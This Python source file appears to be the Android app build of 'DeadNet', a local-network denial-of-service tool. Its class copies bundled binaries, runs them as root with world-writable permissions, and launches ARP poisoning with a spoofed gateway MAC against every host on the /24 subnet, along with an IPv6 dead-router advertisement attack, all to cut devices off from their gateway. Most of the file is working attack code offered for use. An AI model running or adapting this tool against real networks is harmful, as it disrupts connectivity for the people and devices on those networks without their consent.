import os
import re
import time
import logging
import ipaddress
import subprocess
import threading
import platform as pt
from kivy.clock import Clock
from kivy.logger import Logger, LOG_LEVELS
Logger.setLevel(LOG_LEVELS["info"])

from concurrent.futures import ThreadPoolExecutor
from utils import *
from android.permissions import request_permissions, Permission
request_permissions([Permission.WRITE_EXTERNAL_STORAGE, Permission.INTERNET, Permission.ACCESS_WIFI_STATE,
                     Permission.ACCESS_NETWORK_STATE, Permission.ACCESS_FINE_LOCATION, Permission.CHANGE_WIFI_STATE])


#   --------------------------------------------------------------------------------------------------------------------
#   ....................................................................................................................
#   ....................................................................................................................
#   ....................................... ____ ............... _ _ . _ .... _ ........................................
#   .......................................|  _ \  ___  __ _  __| | \ | | ___| |_ ......................................
#   .......................................| | | |/ _ \/ _` |/ _` |  \| |/ _ \ __|......................................
#   .......................................| |_| |  __/ (_| | (_| | |\  |  __/ |_ ......................................
#   .......................................|____/ \___|\__,_|\__,_|_| \_|\___|\__|......................................
#   ....................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
#   --------------------------------------------------------------------------------------------------------------------


class DeadNetAPK:
    _BINARY_MAP = {
        "x86_64": "x86_64",
        "arm": "arm",
        "aarch64": "arm64",
        "i386": "i386",
    }

    def __init__(self, iface: str, gateway_ipv4: str, gateway_ipv6: str, gateway_mac: str, print_mtd: str):
        self._spoof_ipv6ra_interval = 5
        self._executor_sleep_interval = 0.5
        self._max_workers = 3 # todo remove

        self._arp_ind_proc_pid = self._arp_bcast_proc_pid = self._nra_proc_pid = None

        self._network_interface = iface

        self.print_mtd = print_mtd
        self._my_mac = get_device_mac_address_su(self._network_interface)
        if self._my_mac == NET_UNDEFINED:
            raise Exception("Failed to get device MAC address")
        Logger.info(f"DeadNet: Set up user mac as {self._my_mac}")
        self._loop_count = 0

        self._abort = str()
        self._user_abort_reason = f"status - {RED}stopped{COLOR_RESET}"

        arch_type = self._BINARY_MAP.get(pt.machine())
        if not arch_type:
            Logger.info(f"DeadNet: Unsupported device machine architecture {pt.machine()}")
            raise Exception(f"Unsupported device machine architecture -> {pt.machine()}")

        if not self._prepare_binaries(arch_type):
            raise Exception("Failed to prepare binaries")

        self._gateway_ipv6 = gateway_ipv6
        self._ipv6_prefix, self._ipv6_preflen = get_ipv6_prefdata(self._network_interface) if self._gateway_ipv6 != NET_UNDEFINED else (None, None)

        self._spoof_ipv6ra = self._ipv6_prefix and self._ipv6_preflen
        Logger.info(f"DeadNet: spoof_ipv6ra set to {self._spoof_ipv6ra}")

        self._gateway_ipv4 = gateway_ipv4
        self._gateway_mac = gateway_mac
        self._gateway_mac_fake = generate_random_mac()
        Logger.info(f"Deadnet: Generated spoofed gateway mac {self._gateway_mac_fake}")

        device_ipv4 = get_if_addr(self._network_interface)
        if device_ipv4 == NET_UNDEFINED:
            raise Exception(f"Unable to get device_ipv4")
        Logger.info(f"DeadNet: device_ipv4 set to {device_ipv4}")
        subnet_ipv4 = device_ipv4.split(".")[:3]
        subnet_ipv4_sr = f"{'.'.join(subnet_ipv4)}.0/24"  # assuming CIDR length is 24
        Logger.info(f"DeadNet: subnet_ipv4_sr set to {subnet_ipv4_sr}")
        Logger.error(f"DeadNet: subnet_ipv4_sr set to {subnet_ipv4_sr}")
        self._host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(subnet_ipv4_sr) if
                            str(host_ip) != device_ipv4 and str(host_ip) != self._gateway_ipv4]

        self._intro = str()
        if self._spoof_ipv6ra:
            self._intro += f"Dead router attack (IPv6) - {GREEN}enabled{COLOR_RESET}\n" \
                           f"IPv6 prefix - {self._ipv6_prefix}/{self._ipv6_preflen}\n" \
                           f"IPv6 gateway - {self._gateway_ipv6}\n\n"
        else:
            self._intro += f"Dead router attack (IPv6) - {RED}disabled{COLOR_RESET}\n\n"

        self._intro += f"ARP poisoning (IPv4) - {GREEN}enabled{COLOR_RESET}\n" \
                       f"IPv4 subnet range - {subnet_ipv4_sr}\n" \
                       f"IPv4 gateway - {self._gateway_ipv4}\n\n"
        self._intro += f"lladdr gateway - {self._gateway_mac}\n\n"

    def _prepare_binaries(self, arch_type: str) -> bool:
        try:
            # dynamic internal path
            internal_dir = get_app_data_dir()

            # construct source and destination paths
            arp_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'arp.{arch_type}')
            self.arp_path = os.path.join(internal_dir, f'arp.{arch_type}')
            nra_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'nra.{arch_type}')
            self.nra_path = os.path.join(internal_dir, f'nra.{arch_type}')

            for src_path, dest_path in [[arp_orig_path, self.arp_path],
                                        [nra_orig_path, self.nra_path]]:
                subprocess.run(f"su -c 'cp -rf {src_path} {dest_path}'", shell=True, check=True)
                subprocess.run(f"su -c 'chmod 777 {dest_path}'", shell=True, check=True)
                subprocess.run(f"su -c 'chown root {dest_path}'", shell=True, check=True)

            Logger.info("DeadNet: Binaries copied and permissions set successfully")
            return True
        except Exception as e:
            Logger.error(f"DeadNet: Unexpected error - {e}, traceback: {traceback.format_exc()}")
        return False

    def user_abort(self) -> None:
        self._abort = self._user_abort_reason

    def _worker_attack_task(self, idx: int, host_ip: str) -> None:
        if self._spoof_ipv6ra and idx % self._spoof_ipv6ra_interval == 0:
            self._do_ipv6_attack()
        self._do_ipv4_attack(host_ip)

    def _ipv4_arp_ind_attack(self) -> None:
        self._arp_ind_proc_pid = subprocess.Popen(
            ["su", "-c",
             f"{self.arp_path} {self._network_interface} {','.join(self._host_ipv4s)} {self._gateway_mac_fake} "
             f"{self._gateway_ipv4} {self._gateway_mac} {self._my_mac} {self._executor_sleep_interval}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        ).pid
        Logger.info(f"Deadnet: started arp ind attack proc_id {self._arp_ind_proc_pid}")

    def _ipv4_arp_bcast_attack(self) -> None:
        self._arp_bcast_proc_pid = subprocess.Popen(
            ["su", "-c",
             f"{self.arp_path} {self._network_interface} {self._gateway_ipv4} {self._gateway_mac_fake} "
             f"{','.join(self._host_ipv4s)} ff:ff:ff:ff:ff:ff {self._my_mac} {self._executor_sleep_interval}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        ).pid
        Logger.info(f"Deadnet: started arp bcast attack proc_id {self._arp_bcast_proc_pid}")


    def _ipv6_nra_attack(self) -> None:
        # subprocess.Popen(f"su -c {self.nra_path} {self._gateway_mac} {self._gateway_ipv6} "
        #                  f"{self._ipv6_prefix} {self._ipv6_preflen} {self._network_interface}",
        #                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # TODO add sleep and loop
        self._nra_proc_pid = subprocess.Popen(
            ["su", "-c",
             f"{self.nra_path} {self._gateway_mac} {self._gateway_ipv6} {self._ipv6_prefix} "
             f"{self._ipv6_preflen} {self._executor_sleep_interval}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        ).pid
        Logger.info(f"Deadnet: started nra attack proc_id {self._nra_proc_pid}")

    @staticmethod
    def _kill_pid(pid: int):
        if pid is not None:
            try:
                os.kill(pid, signal.SIGKILL)
                Logger.error(f"Deadnet: SIGKILL was sent to{pid}")
            except Exception as e:
                # todo add log here
                Logger.error(f"Deadnet: Unable to kill {pid}: {e} - {traceback.format_exc()}")

    def _start_workers_attack_loop(self) -> None:
        # todo rename method name
        # with ThreadPoolExecutor(max_workers=self._max_workers) as executor:
        #     for idx, ip in enumerate(self._host_ipv4s):
        #         if self._abort:
        #             return
        #         executor.submit(self._worker_attack_task, idx, ip)
        Clock.schedule_once(lambda dt: self.print_mtd(f"{self._intro}status - {GREEN}running...{COLOR_RESET}"))
        # todo add elapsed time

        #self._ipv4_arp_ind_attack()
        self._ipv4_arp_bcast_attack()
        self._ipv6_nra_attack()

        while not self._abort:
            # todo try raise exc here and see if we handle it correctly
            time.sleep(0.5)

        self._terminate_all_attacks()

    def _terminate_all_attacks(self):
        for pid in [self._nra_proc_pid, self._arp_bcast_proc_pid, self._arp_ind_proc_pid]:
            self._kill_pid(pid)

    def start_attack(self) -> None:
        try:
            self._loop_count += 1
            self._start_workers_attack_loop()

        except Exception as e:
            self._abort = "Error in attack loop (check debug logs)"
            Logger.error(f"DeadNet: start_attack exception - {e}, traceback: {traceback.format_exc()}")
        except KeyboardInterrupt:
            Logger.info("DeadNet: start_attack user_interrupt")
            self.user_abort()

        # try terminating in case last time was interrupted by an exception
        self._terminate_all_attacks()

        if self._abort != self._user_abort_reason:
            Clock.schedule_once(lambda dt: self.print_mtd(f"{self._abort}"))
        else:
            Clock.schedule_once(lambda dt: self.print_mtd(f"{self._intro}{self._abort}"))